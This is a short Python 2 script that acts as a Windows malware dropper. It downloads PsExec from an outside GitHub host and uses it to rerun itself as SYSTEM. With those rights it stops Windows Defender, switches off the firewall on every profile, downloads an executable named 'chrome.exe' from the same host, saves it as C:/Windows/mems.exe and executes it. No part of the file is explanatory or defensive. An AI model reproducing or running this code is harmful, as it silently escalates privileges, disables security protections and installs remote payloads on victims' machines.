import urllib2
import os
import getpass
import sys

def download():
	url = "https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe"
	r = urllib2.urlopen(url)
	data = r.read()
	fl = open("C:/Windows/mems.exe", "wb")
	fl.write(data)
	fl.close()

def root():
	url = "https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe"
	r = urllib2.urlopen(url)
	data = r.read()
	usr = str(getpass.getuser())
	if "'" in usr:
		usr = usr.replace("'", "")
	dirt = "C:/Users/"+usr+"/Documenti/Ps.exe"
	fl = open(dirt, "wb")
	fl.write(data)
	fl.close()
	return dirt

def main():
	usr = str(getpass.getuser())
	if "'" in usr:
		usr = usr.replace("'", "")
	if "system" not in usr:
		dirt = root()
		curr_dir = os.getcwd()
		if "'" in curr_dir:
			curr_dir = curr_dir.replace("'", "")
		cmd = dirt + " --accepteula -i -s " + sys.argv[0]
		os.popen(cmd)
	if "system" in usr:
		os.popen("sc stop WinDefend")
		os.popen("netsh advfirewall set allprofiles state off")
		download()
		os.popen("C:/Windows/mems.exe")

main()